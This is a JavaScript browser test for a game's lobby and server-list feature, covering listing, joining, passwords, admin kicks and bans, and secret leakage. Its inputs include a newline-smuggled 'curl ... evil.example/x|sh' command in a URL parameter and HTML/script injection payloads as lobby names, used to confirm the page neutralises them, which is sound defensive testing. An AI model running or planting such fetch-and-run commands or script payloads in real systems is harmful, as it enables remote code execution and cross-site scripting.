// The server list (#526, page/lobbies.ts), checked as a person uses it: the real master (master/) with dedicated
// servers (server.mjs) on the built static realm's release, and two stranger pages of the static realm from a plain
// host of files, joining through the master and data channels. Every step is a key or a click a person makes; the
// page's state is only read (`engine.*`, the DOM), never driven.
//
//   node test/sf-lobbies.mjs [--release dist-sf] [--ports 6060] [--phone] [--shots <dir>] [--headed] [--arriving]
//
// `--arriving` stops after the arrival's steps (below), for a quick run of them alone.
//
// Ports (this lane's, 6060 unless said): +0 the master, +1 the pages' host, +2 to +6 the five worlds' servers (this
// machine only); UDP +0 to +11 the doors' ICE, three for the open server and the arrival's, two for each other. The master lists two
// lobbies a page (`--page-size 2`), so the list is read over several pages.
//
// Servers: Fern Hollow (listed, open, with an admin), Quiet Harbor (listed, a password, one player at most), Back Room
// (not listed: its code), Elsewhere (listed, the generated town: another release), and a host that is only a socket to
// the master, whose name and about are markup. It fails unless:
//   - without ?lobbies=1 there is no way in, lobbies.js is never fetched, and a link with ?master=&lobby= joins nothing;
//   - two visitors who come as people do (no `first=0`: the landing, the way in, the Servers key, a row, Join, both in
//     the same second) have no still picture after the page loads again; each is on foot on the ground, the tiles there
//     come, not inside anything, more than 2 m from the other, looking at something (20 m clear ahead), with the
//     settings folded; Enter, "a car", Enter makes the kept car with no "something is in the way", and the other has it;
//     with it, nothing of the list is fetched until the Servers key is pressed;
//   - the list says when it is empty; shows the listed servers on this release, every page of them, and neither the
//     private one nor the other release's; sorts by its heads; is refreshed by hand; a server that stops leaves it;
//     markup in a name or about is shown as text;
//   - joining by a row's Join (and by the keyboard alone) puts both visitors in the server, the code of the join gone
//     from this tab once the page has loaded; each is in the other's list of who is here; the tag says whose server;
//   - a stranger has no admin control anywhere in the page; the admin password, wrong then right, gives the controls;
//     the admin sets building to admins only (the other's blast, by the hand's click, changes nothing in the world),
//     says as the server (the other sees it), kicks (the other is told and is out), bans (refused as they come back)
//     and lifts the ban;
//   - the password server refuses a wrong password with its line and takes the right one; a full one says so; a code
//     of another release says so; an unknown code says so; the private one is joined by its code; leaving is one's
//     own world again;
//   - the master stopped, the list says so and the page plays on;
//   - the server's password and the admin's are in no request, address, history entry, DOM text or attribute,
//     storage, console line or error.
import { spawn, spawnSync } from 'node:child_process'
import { existsSync, mkdirSync, mkdtempSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { homedir, tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { arg, chrome, has, here } from './kit.mjs'
import { plain } from '../player/serve.mjs'

const failures = []
const step = (what) => console.log(`  · ${what} (${Math.round(process.uptime())} s)`)
const check = (ok, what) => { console.log(`  ${ok ? 'ok  ' : 'FAIL'} ${what}`); if (!ok) failures.push(what) }
const wait = (ms) => new Promise((r) => setTimeout(r, ms))
const PHONE = has('phone')
const folder = resolve(here, arg('release', 'dist-sf'))
const shots = arg('shots', join(homedir(), '.village', 'engine', 'sf', 'lobbies', PHONE ? 'phone' : 'desk'))
mkdirSync(shots, { recursive: true })
const scratch = mkdtempSync(join(tmpdir(), 'engine-lobbies-'))
// Made-up passwords: they are what the sweep at the end looks for.
const PASSWORD = 'kettle-moss-17', ADMIN = 'amber-lantern-42'
const adminFile = join(scratch, 'admin'), passwordFile = join(scratch, 'password')
writeFileSync(adminFile, `${ADMIN}\n`, { mode: 0o600 }); writeFileSync(passwordFile, `${PASSWORD}\n`, { mode: 0o600 })
const BASE = Number(arg('ports', '6060')), port = (n) => BASE + n
const MASTER = `http://127.0.0.1:${port(0)}`
const stops = []
const finish = (code) => { for (const s of stops.reverse()) { try { s() } catch { /* gone */ } } rmSync(scratch, { recursive: true, force: true }); process.exit(code) }
process.on('SIGINT', () => finish(1))
for (const ev of ['unhandledRejection', 'uncaughtException']) process.on(ev, (e) => { console.error(`  FAIL ${e?.stack ?? e}`); finish(1) })
setTimeout(() => { console.error('  FAIL the check ran over 50 minutes'); finish(1) }, 50 * 60_000).unref()

// ── The master ──
const masterDir = resolve(here, '..', 'master'), binary = join(masterDir, 'target', 'release', 'village-master')
if (!existsSync(binary) && spawnSync('cargo', ['build', '--release', '--quiet'], { cwd: masterDir, stdio: 'inherit' }).status !== 0) { console.error('the master did not build'); process.exit(1) }
let master = null
const startMaster = async () => {
  master = spawn(binary, ['--listen', `127.0.0.1:${port(0)}`, '--page-size', '2', '--registrations-per-minute', '100', '--joins-per-minute', '1000', '--lookups-per-minute', '5000', '--max-lobbies-per-addr', '16', '--max-connections-per-addr', '64'], { stdio: ['ignore', 'ignore', 'pipe'] })
  for (let i = 0; ; i++) { try { await fetch(MASTER); break } catch { if (i > 100) { console.error('the master did not start'); finish(1) } await wait(100) } }
}
await startMaster()
stops.push(() => master?.kill('SIGINT'))

// ── Dedicated servers ──
/** Starts server.mjs and answers its lobby's id and code once the master has listed it, with how to stop it. */
async function dedicated(name, n, ice, more = []) {
  const file = join(scratch, `${n}.log`)
  const p = spawn('node', ['server.mjs', '--world', file, '--port', String(port(n)), '--master', MASTER, '--name', name, '--admin-password-file', adminFile, '--ice-ports', ice.map(port).join('-'), ...more], { cwd: here, stdio: ['ignore', 'pipe', 'pipe'] })
  const said = []
  p.stderr.on('data', (d) => { const t = String(d); if (!/ExperimentalWarning|trace-warnings/.test(t)) process.stderr.write(`  ${name}: ${t}`) })
  const lobby = await new Promise((done, no) => {
    p.stdout.on('data', (d) => { said.push(String(d)); const m = /lobby ([0-9a-z]{12}), code ([0-9a-z]{20})/.exec(said.join('')); if (m) done({ id: m[1], code: m[2] }) })
    p.on('exit', (code) => no(new Error(`${name} ended (${code}): ${said.join('').slice(-400)}`)))
    setTimeout(() => no(new Error(`${name} was not listed in 3 minutes: ${said.join('').slice(-400)}`)), 180_000)
  })
  stops.push(() => p.kill('SIGKILL'))
  return { ...lobby, name, file, world: `http://127.0.0.1:${port(n)}`, stop: () => new Promise((done) => { p.once('exit', done); p.kill('SIGINT') }) }
}
/** A host that is only its socket to the master: listed, and nothing behind it. */
async function hollow({ name, about = '', pin, most = 8 }) {
  const ws = new WebSocket(`${MASTER.replace(/^http/, 'ws')}/host`)
  const id = await new Promise((done, no) => {
    ws.onopen = () => ws.send(JSON.stringify({ hello: { proto: 1, name, about, pin, most, listed: true } }))
    ws.onmessage = (e) => { const m = JSON.parse(String(e.data)); if (m.welcome) done(m.welcome.id) }
    ws.onerror = () => no(new Error('the master refused a host'))
    ws.onclose = (e) => no(new Error(`the master closed a host (${e.code} ${e.reason})`))
  })
  const beat = setInterval(() => { try { ws.send(JSON.stringify({ now: { players: 0 } })) } catch { /* closed */ } }, 15_000)
  const stop = () => { clearInterval(beat); try { ws.close() } catch { /* closed */ } }
  stops.push(stop)
  return { id, stop }
}

const site = await plain(folder, '127.0.0.1', port(1))
stops.push(() => site.stop())
// The other release first: listed, and never on this page's list.
const elsewhere = await dedicated('Elsewhere', 5, [7, 8])
const pin = (await (await fetch(`${MASTER}/lobbies/${elsewhere.code}`)).json()).pin
check(pin === 'town', `a server of the generated town is listed with the master (${pin})`)

// ── Pages ──
const browser = await chrome()
stops.push(() => browser.close())
const errors = [], consoled = [], requests = [], dialogs = [], agreements = []
const VIEW = PHONE ? { viewport: { width: 390, height: 844 }, deviceScaleFactor: 2, isMobile: true, hasTouch: true } : { viewport: { width: 1280, height: 720 }, deviceScaleFactor: 1 }
const Q = 'first=0&boards=0&fly=0&fire=0&sound=0&scale=0.5'
/** A stranger's page of the static realm, in a context of its own. */
async function stranger(name, query = `lobbies=1&master=${encodeURIComponent(MASTER)}&${Q}`, refuses = false) {
  const context = await browser.newContext(VIEW)
  context.on('request', (r) => requests.push({ who: name, url: r.url(), body: r.postData() ?? '' }))
  const page = await context.newPage()
  page.setDefaultTimeout(60_000)
  page.on('pageerror', (e) => errors.push(`${name}: ${e.message}`))
  page.on('console', (m) => { consoled.push(m.text()); if (m.type() === 'error') console.log(`  ${name}'s page: ${m.text().slice(0, 300)}`) })
  // The one dialog there may be: the browser's own question before a list the address named is asked for (main.ts
  // `agreed`), once a tab. This visitor says yes; any other dialog is a fault.
  page.on('dialog', (d) => { if (d.type() === 'confirm' && d.message().includes('names a server list at')) { agreements.push(`${name}: ${d.message()}`); void (refuses ? d.dismiss() : d.accept()) } else { dialogs.push(`${name}: ${d.type()} ${d.message()}`); void d.dismiss() } })
  const from = Date.now()
  await page.goto(`${site.url}/sf/index.html?${query}`)
  return { name, page, context, from }
}
/** The page is up: its controls are there and the park is shown. */
const up = (p, ms = 240_000) => p.page.waitForFunction(() => globalThis.engine?.realmControls && globalThis.engine.seen?.near > 0, null, { timeout: ms, polling: 250 })
// (A kit panel is built from blocks as it opens, SPEC 7: the picture once it stands.)
const shot = async (p, name) => { await p.page.waitForTimeout(1100); await p.page.screenshot({ path: join(shots, `${name}.png`) }) }
const visible = (p, sel) => p.page.evaluate((sel) => { const el = document.querySelector(sel); return !!el && el.checkVisibility() }, sel)
/** The Servers key in its corner, pressed. */
async function servers(p) {
  await p.page.click('#realm button.lobbies')
  await p.page.waitForSelector('#lobbies[open]', { timeout: 30_000 })
}
/**
 * What a corner key (the Servers key, the lobby's tag) meets, by its solid (a kit key stands up and to the left of its
 * face by half its height, as test/sf-hud.mjs measures it): the other controls over the picture and the body's parts.
 */
const corner = (p, sel) => p.page.evaluate((sel) => {
  const solid = (el) => { const b = el.getBoundingClientRect(), cs = getComputedStyle(el), vx = parseFloat(cs.getPropertyValue('--vx')) || 4, lift = el.hasAttribute('data-vx-live') ? (parseFloat(cs.getPropertyValue('--vx-face-z')) || 0) * 0.5 * vx : 0; return { left: b.left - lift, top: b.top - lift, right: b.right, bottom: b.bottom } }
  const meets = (a, b) => a.left < b.right - 0.5 && a.right > b.left + 0.5 && a.top < b.bottom - 0.5 && a.bottom > b.top + 0.5
  const me = document.querySelector(sel)
  if (!me?.checkVisibility()) return { shown: false, hits: [] }
  const mine = solid(me)
  const others = [...document.querySelectorAll('#realm .cue.on, #realm .act :is(.use, .up, .down, .walks, .toolkey), #realm .held, #realm .fold, #realm .sky, #realm .tools, #realm .egg-line, #first .credits, #where, #door-notice')].filter((el) => el !== me && !el.closest('[hidden]') && el.checkVisibility({ visibilityProperty: true, opacityProperty: true }) && el.getBoundingClientRect().width > 2)
  const hits = others.filter((el) => meets(mine, solid(el))).map((el) => el.id || el.className)
  for (const part of globalThis.engine.playHud?.parts?.() ?? []) if (meets(mine, part)) hits.push('the body')
  const vw = innerWidth, vh = innerHeight
  if (mine.left < 0 || mine.top < 0 || mine.right > vw || mine.bottom > vh) hits.push('the screen\'s edge')
  return { shown: true, hits, box: [mine.left, mine.top, mine.right, mine.bottom].map(Math.round) }
}, sel)
const rows = (p) => p.page.evaluate(() => [...document.querySelectorAll('#lobbies tbody tr[data-id]')].map((tr) => tr.querySelector('.nm').textContent))
const listLine = (p) => p.page.evaluate(() => document.querySelector('#lobbies .list-line')?.textContent ?? '')
const listed = (p, want, ms = 20_000) => p.page.waitForFunction((want) => { const n = [...document.querySelectorAll('#lobbies tbody tr[data-id]')].map((tr) => tr.querySelector('.nm').textContent).sort().join('|'); return n === [...want].sort().join('|') }, want, { timeout: ms }).then(() => true, () => false)
const row = (name) => `#lobbies tbody tr[data-id]:has(.nm:text-is("${name}"))`
/** Presses a key that loads the page again, and waits for it to be up. */
async function reloads(p, act) {
  await Promise.all([p.page.waitForNavigation({ waitUntil: 'load', timeout: 60_000 }), act()])
  p.from = Date.now()
}
const inLobby = (p, ms = 120_000) => p.page.waitForFunction(() => globalThis.engine?.lobby?.you, null, { timeout: ms, polling: 250 }).then(() => true, () => false)
const ticketGone = (p) => p.page.evaluate(() => sessionStorage.getItem('village.join') === null)
const people = async (p) => {
  if (!(await p.page.evaluate(() => document.querySelector('#lobbies')?.open && !document.querySelector('#lobbies section[data-view=here]').hidden))) await p.page.click('#lobby-tag')
  await p.page.waitForFunction(() => document.querySelectorAll('#lobbies .people li').length > 0, null, { timeout: 15_000 }).catch(() => {})
  return p.page.evaluate(() => [...document.querySelectorAll('#lobbies .people li')].map((li) => li.firstChild.textContent))
}
/** The private code's field, behind its disclosure: opened by its summary, as a hand does, then typed in. */
const code = async (p, value) => { if (!(await p.page.evaluate(() => document.querySelector('#lobbies .code-way').open))) await p.page.click('#lobbies .code-way summary'); await p.page.fill('#lobbies-code', value) }
const close = async (p) => { if (await p.page.evaluate(() => document.querySelector('#lobbies')?.open)) { await p.page.keyboard.press('Escape'); await p.page.waitForTimeout(400) } }
/** Joins a row of the list by its Join key. */
async function joinRow(p, name) {
  await p.page.click(row(name))
  await reloads(p, () => p.page.click('#lobbies .k-join'))
}
const size = (file) => { try { return statSync(file).size } catch { return 0 } }
/** The hand's key: the hammer (1), the picture clicked to take the pointer, the look brought down to the ground, a click. */
async function blast(p) {
  await close(p)
  if (PHONE) {
    // By touch: the hammer's key in the bank, a thumb dragged down the right half to look at the ground, then Use.
    await p.page.tap('#realm .tools label:has(input[value="0"])').catch(() => {})
    const cdp = await p.context.newCDPSession(p.page), x = 300, y = 300
    await cdp.send('Input.dispatchTouchEvent', { type: 'touchStart', touchPoints: [{ x, y }] })
    for (let i = 1; i <= 10; i++) { await cdp.send('Input.dispatchTouchEvent', { type: 'touchMove', touchPoints: [{ x, y: y + 22 * i }] }); await p.page.waitForTimeout(30) }
    await cdp.send('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] })
    await p.page.waitForTimeout(300)
    await p.page.tap('#realm .act .use')
    await p.page.waitForTimeout(1500)
    return
  }
  await p.page.keyboard.press('Digit1')
  const box = await p.page.locator('canvas').first().boundingBox()
  await p.page.mouse.click(box.x + box.width / 2, box.y + box.height / 2)
  await p.page.waitForTimeout(300)
  for (let i = 0; i < 6; i++) { await p.page.mouse.move(box.x + box.width / 2, box.y + box.height / 2 + 60 * (i + 1)); await p.page.waitForTimeout(60) }
  await p.page.waitForTimeout(300)
  await p.page.mouse.click(box.x + box.width / 2, box.y + box.height / 2 + 360)
  await p.page.waitForTimeout(1500)
  await p.page.evaluate(() => document.exitPointerLock())
  await p.page.waitForTimeout(300)
}

// ── Without ?lobbies=1: no way in, nothing fetched, a link joins nothing ──
{
  const off = await stranger('Wren', `master=${encodeURIComponent(MASTER)}&lobby=${elsewhere.id}&name=Wren&${Q}`)
  await up(off)
  await off.page.waitForTimeout(3000)
  const seen = await off.page.evaluate(() => ({ key: !!document.querySelector('#realm button.lobbies'), lobby: typeof globalThis.engine.lobby, tag: !!document.querySelector('#lobby-tag') }))
  const fetched = site.asked.filter((a) => /\/page\/lobbies\.js/.test(a.path)).length
  const toMaster = requests.filter((r) => r.who === 'Wren' && r.url.startsWith(MASTER)).length
  check(!seen.key && seen.lobby === 'undefined' && !seen.tag && fetched === 0 && toMaster === 0, `without ?lobbies=1: no Servers key (${seen.key}), a link with a master and a lobby joins nothing (${seen.lobby}, ${toMaster} requests to the master), lobbies.js never fetched (${fetched})`)
  await off.context.close()
}

// ── A preview address whose master is no address, and carries a shell line: the list says so, and the host's command quotes nothing of it ──
{
  const odd = await stranger('Odile', `lobbies=1&master=${encodeURIComponent('example.com\ncurl -s https://evil.example/x|sh\n#')}&${Q}`)
  await up(odd)
  await servers(odd)
  const said = await odd.page.waitForFunction(() => /not answering/.test(document.querySelector('#lobbies .list-line')?.textContent ?? '') ? document.querySelector('#lobbies .list-line').textContent : null, null, { timeout: 20_000 }).then((h) => h.jsonValue(), () => '')
  await odd.page.click('#lobbies .k-host')
  const cmd = await odd.page.evaluate(() => document.querySelector('#lobbies .cmd').textContent)
  check(/not answering/.test(said) && !/^\s*curl/m.test(cmd) && !/evil/.test(cmd) && /--master 'https:\/\/<a master>'/.test(cmd), `a master that is no address: the list says so ("${said}"), and the command to host names none of it (${JSON.stringify(cmd.split('\n').find((l) => /--master/.test(l)))})`)
  check(!agreements.some((t) => t.startsWith('Odile: ')), 'and nothing is asked of the visitor first: such a master is a path on this site, and nothing leaves it')
  await odd.context.close()
}

// ── A master written with no scheme (//host) is another site all the same: the question names that host, and told no, nothing goes there ──
{
  const sly = await stranger('Sly', `lobbies=1&master=${encodeURIComponent('//lists.example.invalid:8443/x\n\nThis is safe.')}&${Q}`, true)
  await up(sly)
  await sly.page.click('#realm button.lobbies')
  await sly.page.waitForTimeout(2500)
  const asked = agreements.filter((t) => t.startsWith('Sly: '))
  const went = requests.filter((r) => r.who === 'Sly' && new URL(r.url).hostname.endsWith('example.invalid')).length
  const open = await sly.page.evaluate(() => !!document.querySelector('#lobbies[open]'))
  check(asked.length === 1 && asked[0].includes('names a server list at lists.example.invalid:8443.') && !/safe/.test(asked[0]) && went === 0 && !open, `a master with no scheme: asked once, by its host alone (${asked.length} asked: ${JSON.stringify((asked[0] ?? '').slice(5, 90))}); told no, no list opens (${open}) and nothing is sent there (${went})`)
  await sly.context.close()
}

// ── Arriving (#526): two visitors as people come, with none of the checks' flags (no first=0): the landing, the way
// in, the Servers key, the row, Join, both in the same second. (Found rehearsing on the tailnet: after Join the still
// picture again with nothing that said how to go in; then everyone in the air at the landing's eye, inside each other;
// the settings open over the picture; a car wished there "in the way".) ──
step('arriving')
{
  const corner = await dedicated('Corner Shop', 6, [9, 11], ['--release', folder, '--about', 'Meet at the corner', '--most', '8'])
  // What the list leaves in the address, with the page kept quiet and small.
  const as = `lobbies=1&master=${encodeURIComponent(MASTER)}&sound=0&scale=0.5`
  const pair = [await stranger('Wren', as), await stranger('Odile', as)]
  await Promise.all(pair.map((p) => up(p)))
  const tap = (p, x, y) => (PHONE ? p.page.touchscreen.tap(x, y) : p.page.mouse.click(x, y))
  for (const p of pair) {
    // The way in a visitor takes: the EXPLORE board opens the map picker, and Start dives in.
    const landing = await p.page.evaluate(() => document.documentElement.classList.contains('first'))
    await p.page.waitForFunction(() => globalThis.engine.explore && globalThis.engine.boards?.where('explore'), null, { timeout: 120_000 })
    const w = await p.page.evaluate(() => globalThis.engine.boards.where('explore'))
    await tap(p, w.x, w.y)
    await p.page.waitForFunction(() => globalThis.engine.map?.picking, null, { timeout: 10_000 })
    await p.page.locator('#world-map .wm-visit').click()
    const roof = await p.page.waitForFunction(() => globalThis.engine.explore.state === 'in' && globalThis.engine.me.feet, null, { timeout: 90_000 }).then(() => true, () => false)
    check(landing && roof, `${p.name} opens on the landing (${landing}) and goes in via the EXPLORE map picker (${roof})`)
    await p.page.waitForTimeout(1500)
    // The Servers key, the row, the name.
    await servers(p)
    await p.page.waitForSelector(row('Corner Shop'), { timeout: 30_000 })
    await p.page.fill('#lobbies-name', p.name)
    await p.page.click(row('Corner Shop'))
  }
  // Join, both in the same second.
  await Promise.all(pair.map((p) => reloads(p, () => p.page.click('#lobbies .k-join'))))
  const inside = await Promise.all(pair.map((p) => inLobby(p)))
  check(inside.every(Boolean), `both press Join in the same second and are in Corner Shop once their pages have loaded again (${inside.join(', ')})`)
  const after = await Promise.all(pair.map((p) => p.page.evaluate(() => ({ href: location.href, first: document.documentElement.classList.contains('first') }))))
  check(after.every((a) => !a.first && !/first=|lobby=|[?&]at=/.test(a.href)), `no still picture stands between them and the world, and the address holds no flag of the checks' (${after.map((a) => `${a.first ? 'the landing' : 'in'}: ${a.href.replace(site.url, '')}`).join('; ')})`)
  // Where the still picture is up anyway (as it was before #526's fix), a person clicks it to go in (main.ts `noWayIn`).
  for (const [i, p] of pair.entries()) if (after[i].first) {
    const b = await p.page.locator('canvas').first().boundingBox(); await tap(p, b.x + b.width / 2, b.y + b.height / 2); await p.page.waitForTimeout(1200)
    if (await p.page.evaluate(() => !globalThis.engine.first?.engaged)) { await p.page.keyboard.press('KeyW'); await p.page.waitForTimeout(1200) }
  }
  // Set down: where each stands once the page has done arriving (a minute at most), with the tiles there made.
  await Promise.all(pair.map((p) => p.page.waitForFunction(() => globalThis.engine?.seen?.near > 0 && globalThis.engine.arrival?.state !== 'waiting' && (globalThis.engine.arrival || null), null, { timeout: 120_000, polling: 250 }).catch(() => {})))
  for (const p of pair) await p.page.waitForFunction(() => { const s = globalThis.engine.world.stats; return s.wanted === 0 && s.stale === 0 }, null, { timeout: 120_000 }).catch(() => {})
  await wait(2000)
  const stood = await Promise.all(pair.map((p) => p.page.evaluate(() => {
    const e = globalThis.engine, f = e.me.feet, at = f?.at.map(Math.round) ?? null
    // In nothing: the cells of the body's height over its feet are air (from a step over them), and under them is something.
    let inside = 0, under = 0
    if (at) { for (let y = at[1] + 3; y < at[1] + 18; y++) if (e.kind(at[0], y, at[2])) inside++; under = e.kind(at[0], at[1] - 1, at[2]) || e.kind(at[0], at[1] - 2, at[2]) }
    return { on: e.me.on, at, arrival: e.arrival ?? null, inside, under, engaged: e.first?.engaged ?? null, panel: document.querySelector('#realm .sky')?.checkVisibility() ?? null, pills: [...document.querySelectorAll('button')].filter((b) => /^(Portal|Realms)$/.test(b.textContent.trim()) && b.checkVisibility()).length, ground: at ? e.ground(at[0] / 10, at[2] / 10) * 10 : null }
  })))
  for (const [i, p] of pair.entries()) {
    const s = stood[i]
    check(s.on && !!s.at && s.arrival?.state === 'standing' && s.inside === 0 && s.under !== 0, `${p.name} is on foot on something solid (${JSON.stringify({ on: s.on, feet: s.at, arrival: s.arrival?.state, round: s.arrival?.round, ground: s.ground, over: s.at && s.ground !== null ? s.at[1] - s.ground : null })}), not in anything (${s.inside} cells of the body's height filled)`)
    check(s.engaged !== false && s.panel === false, `${p.name} is in the world (${s.engaged}) with the settings folded behind their key (${s.panel ? 'open' : 'folded'})`)
    // (Realms and portals are an admin's at a door, by their keys: a visitor is shown no key for what they would be refused, and on a phone those two lay over Charge.)
    check(s.pills === 0, `${p.name} is shown no Portal or Realms key in someone else's server (${s.pills})`)
  }
  const apart = stood[0].at && stood[1].at ? Math.hypot(stood[0].at[0] - stood[1].at[0], stood[0].at[2] - stood[1].at[2]) / 10 : 0
  check(apart > 2, `joined in the same second they stand ${apart.toFixed(2)} m apart (more than 2)`)
  // Whoever was set down behind has the other in their picture: ahead of the eye, inside the lens across.
  const inSight = await Promise.all(pair.map((p, i) => p.page.evaluate((other) => {
    if (!other) return false
    const e = globalThis.engine, v = e.view(), d = [other[0] - v.eye[0], other[2] - v.eye[2]], h = Math.hypot(v.forward[0], v.forward[2]), fx = v.forward[0] / h, fz = v.forward[2] / h
    const along = d[0] * fx + d[1] * fz, across = Math.abs(d[0] * -fz + d[1] * fx), half = Math.atan((Math.tan((e.fov * Math.PI) / 360) * innerWidth) / innerHeight)
    return along > 0 && Math.atan2(across, along) < half * 0.9
  }, stood[1 - i].at)))
  check(inSight.some(Boolean), `whoever stands behind has the other in their picture (${pair.map((p, i) => `${p.name} sees ${pair[1 - i].name}: ${inSight[i]}`).join(', ')})`)
  // Ahead of each, along where the eye looks: the first solid at its height, level.
  const facing = await Promise.all(pair.map((p) => p.page.evaluate(() => { const e = globalThis.engine, v = e.view(), out = []; for (let d = 6; d <= 200; d += 4) out.push(e.kind(Math.round(v.eye[0] + v.forward[0] / Math.hypot(v.forward[0], v.forward[2]) * d), Math.round(v.eye[1]), Math.round(v.eye[2] + v.forward[2] / Math.hypot(v.forward[0], v.forward[2]) * d))); const near = out.findIndex(Boolean); return near < 0 ? null : 6 + near * 4 })))
  check(facing.every((d) => d === null || d > 100), `each looks at something, not at a wall: the first solid straight ahead at eye height is ${facing.map((d) => (d === null ? 'past 20 m' : `${(d / 10).toFixed(1)} m`)).join(' and ')} off`)
  // Where each look falls: on the ground some 10 m ahead of their own feet (a wish made at once is made there), not
  // down the hill past the crest. Read from the eye as it rides, a moment after arriving.
  await wait(1500)
  const falls = await Promise.all(pair.map((p, i) => p.page.evaluate((feet) => {
    const e = globalThis.engine, v = e.view(), n = Math.hypot(v.forward[0], v.forward[1], v.forward[2])
    for (let t = 5; t <= 3000; t += 5) { const x = v.eye[0] + (v.forward[0] / n) * t, y = v.eye[1] + (v.forward[1] / n) * t, z = v.eye[2] + (v.forward[2] / n) * t; if (y <= e.feet(Math.round(x), Math.round(z))) return Math.hypot(x - feet[0], z - feet[2]) / 10 }
    return null
  }, stood[i].at)))
  check(falls.every((d) => d !== null && d >= 5 && d <= 18), `each looks at the ground about 10 m ahead of their feet (${falls.map((d) => (d === null ? 'nowhere within 300 m' : `${d.toFixed(1)} m`)).join(' and ')})`)
  for (const p of pair) await shot(p, `arrived-${p.name.toLowerCase()}`)
  // A wish there, by the keys (a thumb on the bar on a phone): Enter, "a car", Enter makes the kept car, no model.
  const [w, o] = pair
  if (PHONE) await w.page.tap('#line'); else await w.page.keyboard.press('Enter')
  await w.page.waitForTimeout(600)
  await w.page.keyboard.type('a car', { delay: 40 }); await w.page.waitForTimeout(1500)
  await w.page.keyboard.press('Enter')
  const wished = await w.page.waitForFunction(() => { const t = [...globalThis.engine.things.all.values()]; if (t.length) return { name: t[0].name, at: t[0].at }; return /something is in the way/.test(document.body.innerText) ? { held: true } : null }, null, { timeout: 60_000, polling: 200 }).then((h) => h.jsonValue(), () => null)
  const seenBy = await o.page.waitForFunction(() => globalThis.engine.things.all.size > 0, null, { timeout: 30_000 }).then(() => true, () => false)
  check(!!wished?.name && !wished.held && seenBy, `Wren's Enter, "a car", Enter there makes ${wished?.name ?? (wished?.held ? 'nothing: "something is in the way"' : 'nothing')}${wished?.at ? ` ${(Math.hypot(wished.at[0] - stood[0].at[0], wished.at[2] - stood[0].at[2]) / 10).toFixed(0)} m from her` : ''}, and Odile's page has it (${seenBy})`)
  await wait(1500)
  for (const p of pair) await shot(p, `wished-${p.name.toLowerCase()}`)
  for (const p of pair) await p.context.close()
  await corner.stop()
}
if (has('arriving')) { console.log(`  pictures in ${shots}`); console.log(failures.length ? `\n${failures.length} failed` : '\nall passed'); finish(failures.length ? 1 : 0) }

// ── Two strangers, with ?lobbies=1: nothing of the list before the Servers key ──
const ada = await stranger('Ada'), bram = await stranger('Bram')
await Promise.all([up(ada), up(bram)])
{
  const until = site.asked.filter((a) => a.at >= ada.from && a.at <= Date.now())
  const early = until.filter((a) => /\/page\/(lobbies|door)\.js/.test(a.path)).map((a) => a.path)
  check(early.length === 0, `with ?lobbies=1 nothing of the list or the door is fetched before it is asked for (${early.join(', ') || 'none'})`)
  console.log(`  until the park: ${until.length} files, ${(until.reduce((n, a) => n + (a.wire ?? 0), 0) / 1e6).toFixed(2)} MB on the wire (both pages)`)
}

// ── The way in: a key of its own, clear of everything ──
{
  const at = await corner(ada, '#realm button.lobbies')
  const named = await ada.page.evaluate(() => { const b = document.querySelector('#realm button.lobbies'); return { name: b.textContent.trim(), popup: b.getAttribute('aria-haspopup') } })
  check(at.shown && !at.hits.length && named.name === 'Servers' && named.popup === 'dialog', `the Servers key stands in its corner clear of every other control and of the body (${JSON.stringify(at)}; "${named.name}", ${named.popup})`)
  await shot(ada, 'key')
}
// ── The list: empty, then full ──
await servers(ada)
check(await ada.page.waitForFunction(() => /No servers/.test(document.querySelector('#lobbies tbody')?.textContent ?? ''), null, { timeout: 15_000 }).then(() => true, () => false), `with only another release's server listed, the list says there are none (${(await ada.page.evaluate(() => document.querySelector('#lobbies tbody').textContent)).slice(0, 100)})`)
await shot(ada, 'list-empty')
check(site.asked.some((a) => /\/page\/lobbies\.js/.test(a.path)), 'lobbies.js is fetched once the Servers key is pressed')

step('the servers')
const fern = await dedicated('Fern Hollow', 2, [0, 2], ['--release', folder, '--about', 'Bricks, talk and a long table at dusk', '--most', '4'])
const harbor = await dedicated('Quiet Harbor', 3, [3, 4], ['--release', folder, '--about', 'Ask Ada for the word', '--most', '1', '--password-file', passwordFile])
const back = await dedicated('Back Room', 4, [5, 6], ['--release', folder, '--private'])
const thisPin = (await (await fetch(`${MASTER}/lobbies/${fern.id}`)).json()).pin
const MARKUP = '<img src=x onerror=__pwned=1>Tea <b>party</b>', MARKUP_ABOUT = '<a href="https://example.invalid/">click me</a> & <script>window.__pwned=2</script>'
const markup = await hollow({ name: MARKUP, about: MARKUP_ABOUT, pin: thisPin })
step('refresh')
await ada.page.click('#lobbies .refresh')
const want = ['Fern Hollow', 'Quiet Harbor', MARKUP]
const got = await listed(ada, want)
check(got, `refreshed by hand, the list shows the three listed servers on this release, over two pages of the master's (${(await rows(ada)).join(' | ')}), neither Back Room (private) nor Elsewhere (another release)`)
const raw = await ada.page.evaluate(() => { const tr = [...document.querySelectorAll('#lobbies tbody tr[data-id]')].find((t) => t.querySelector('.nm').textContent.includes('Tea')); return { nm: tr?.querySelector('.nm').textContent, ab: tr?.querySelector('.ab')?.textContent, tags: document.querySelectorAll('#lobbies tbody :is(img, a, b, script)').length, pwned: globalThis.__pwned ?? null } })
check(raw.nm === MARKUP && raw.ab === MARKUP_ABOUT.replace(/\s+/g, ' ').slice(0, 120) && raw.tags === 0 && raw.pwned === null, `a lobby whose name and about are markup shows them as text (${JSON.stringify(raw)})`)
await shot(ada, 'list')
// Sorting by the heads.
const order = async () => (await rows(ada)).map((n) => (n === MARKUP ? 'Tea' : n)).join(', ')
await ada.page.click('#lobbies thead th[data-key=name] button')
const byName = await order()
await ada.page.click('#lobbies thead th[data-key=name] button')
const byNameDown = await order()
await ada.page.click('#lobbies thead th[data-key=locked] button')
const byLock = await order()
const sorts = await ada.page.evaluate(() => document.querySelector('#lobbies thead th[aria-sort]')?.dataset.key + ' ' + document.querySelector('#lobbies thead th[aria-sort]')?.getAttribute('aria-sort'))
// (As the page's language orders words: the markup's "<" comes before any letter.)
const words = ['Fern Hollow', 'Quiet Harbor', MARKUP].sort(new Intl.Collator(undefined, { sensitivity: 'base', numeric: true }).compare).map((n) => (n === MARKUP ? 'Tea' : n))
check(byName === words.join(', ') && byNameDown === [...words].reverse().join(', ') && byLock.startsWith('Quiet Harbor') && sorts === 'locked descending', `the heads sort: by name (${byName}), again the other way (${byNameDown}), the password ones first (${byLock}; ${sorts})`)
// A server that stops leaves the list.
markup.stop()
